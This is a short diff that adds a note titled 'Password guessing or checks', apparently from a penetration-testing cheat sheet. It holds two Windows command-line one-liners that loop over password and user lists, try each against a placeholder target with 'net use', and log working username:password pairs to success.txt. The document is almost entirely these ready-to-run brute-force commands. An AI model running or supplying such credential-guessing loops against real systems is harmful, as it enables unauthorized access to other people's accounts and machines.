@@ -1,0 +1,4 @@
+Password guessing or checks:
+
+        # for /f %i in (<PASSWORD FILENAME>.txt) do @echo %i & net use \\<TARGET IP ADDRESS> %i /u:<USER NAME> 2>nul && pause
+        # for /f %i in (<PASSWORD FILENAME>.txt) do @(for /f %j in (<PASSWORD FILENAME>.txt) do @echo %i:%j & @net use \\<TARGET IP ADDRESS> %j /u:%i 2>nul && echo %i:%j >> success.txt && net use \\<IP ADDRESS> /del)
